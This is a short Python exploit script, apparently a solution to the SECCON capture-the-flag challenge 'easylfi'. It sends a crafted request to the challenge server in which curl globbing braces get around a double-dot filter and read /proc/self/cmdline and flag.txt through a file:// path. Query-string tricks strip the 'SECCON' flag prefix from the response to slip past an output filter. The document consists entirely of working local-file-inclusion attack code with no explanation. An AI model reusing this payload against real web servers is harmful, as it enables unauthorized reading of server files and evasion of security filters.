import requests

URL = "http://easylfi.seccon.games:3000"
# URL = "http://127.0.0.1:3000"


def req(url=URL):
    req = requests.Request("GET", url)
    res = req.prepare()
    payload = (
        "/{.}./{.}./{/proc/self/cmdline,flag.txt}" +  # bypass double dot
        "?" +
        # membuang SECCON dari output
        "&{/proc/self/cmdline,flag.txt}={" +
        "&{={}" +
        "&{}=}{" +
        "&{%00--_curl_--file:///app/public/../../flag.txt%0aSECCON}=a"
    )
    res.url = url + payload
    res = requests.Session().send(res)
    print(res.text)
req()